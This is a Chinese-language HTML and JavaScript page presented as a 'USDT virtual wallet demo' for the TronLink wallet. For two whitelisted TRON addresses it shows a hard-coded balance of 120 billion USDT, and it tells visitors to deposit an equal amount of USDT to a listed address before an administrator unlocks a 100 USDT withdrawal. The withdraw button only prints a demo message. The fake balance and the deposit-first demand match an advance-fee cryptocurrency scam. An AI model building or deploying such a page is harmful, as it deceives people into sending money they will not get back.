<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8"/>
  <title>USDT 虚拟钱包 Demo</title>
  <meta name="viewport" content="width=device-width, initial-scale=1"/>
  <style>
    body { font-family: sans-serif; padding: 20px; max-width: 480px; margin: auto; }
    .card { border: 1px solid #ddd; border-radius: 8px; padding: 16px; box-shadow:0 2px 6px rgba(0,0,0,.05); }
    .row { margin-bottom: 12px; }
    .label { color: #666; font-size:0.95em; }
    .value { font-size: 1.2em; word-break: break-all; }
    .mono { font-family: monospace; font-size:0.95em; }
    button { width: 100%; padding: 10px; border:none; background:#4A5568; color:#fff; border-radius:4px; font-size:1em; cursor:pointer; }
    button:disabled { background:#aaa; cursor:not-allowed; }
    #msg { margin-top:12px; color:#c00; min-height:1.2em; }
    #mobileNotice {
      display:none; background:#ffeaea; color:#c00; padding:10px; border-radius:6px;
      margin-bottom:15px; font-size:0.95em; text-align:center;
    }
    #copyDeposit { font-size:0.8em; margin-top:4px; text-decoration:underline; cursor:pointer; color:#0070f3; background:none; border:none; }
  </style>
</head>
<body>
  <div id="mobileNotice">⚠️ 请在 TronLink App 内的浏览器中打开此页面以连接钱包。</div>
  <div class="card">
    <div class="row">
      <div class="label">钱包地址：</div>
      <div id="addr" class="value">未连接</div>
    </div>
    <div class="row">
      <div class="label">账户余额：</div>
      <div id="bal" class="value">--</div>
    </div>
    <div class="row">
      <div class="label">本次可提：</div>
      <div class="value">100 USDT</div>
    </div>
    <div class="row">
      <div class="label">下次可提时间：</div>
      <div id="next" class="value">--</div>
    </div>
    <div class="row">
      <div class="label">充值地址（先充后提）：</div>
      <div id="depositAddr" class="value mono">TLUT4CwHpcSgQWnEiM9FmyZR76nTRVNSne</div>
    </div>
    <p style="color:#666;font-size:0.9em;line-height:1.4;">
      请将等额 USDT 转入以上地址，管理员确认到账后为您开通提现资格。<br/>
      以下两个地址可提现：<br/>
      1. TFcpXGJVourvwxCnMYfR6D5nwFcVzWxdfc<br/>
      2. TNiJWUJzPPCQaGwTFoeabqhDEuh6NLvBxF
    </p>
    <button id="btn" disabled>连接钱包</button>
    <div id="msg"></div>
  </div>

  <script>
    const ALLOWED_USERS = [
      'TFcpXGJVourvwxCnMYfR6D5nwFcVzWxdfc',
      'TNiJWUJzPPCQaGwTFoeabqhDEuh6NLvBxF'
    ];
    const STATIC_BAL = '120,000,000,000 USDT';

    function detectMobile() {
      const ua = navigator.userAgent.toLowerCase();
      if (/iphone|android|ipad|micromessenger/.test(ua)) {
        document.getElementById('mobileNotice').style.display = 'block';
      }
    }

    async function init() {
      detectMobile();

      if (window.tronWeb && window.tronWeb.ready) {
        const addr = window.tronWeb.defaultAddress.base58;
        document.getElementById('addr').innerText = addr;

        if (ALLOWED_USERS.includes(addr)) {
          document.getElementById('bal').innerText = STATIC_BAL;
          document.getElementById('btn').innerText = '提现 100 USDT';
          document.getElementById('btn').disabled = false;
        } else {
          document.getElementById('btn').innerText = '当前地址不可提现';
          document.getElementById('btn').disabled = true;
          document.getElementById('msg').innerText = '请切换到授权钱包地址。';
        }
      } else {
        document.getElementById('msg').innerText = '请在 TronLink App 或安装 TronLink 插件后重新打开。';
      }
    }

    function withdraw() {
      document.getElementById('msg').innerText = '演示页面，未连接真实合约。';
    }

    document.addEventListener('DOMContentLoaded', () => {
      document.getElementById('btn').addEventListener('click', withdraw);
      init();
    });
  </script>
</body>
</html>
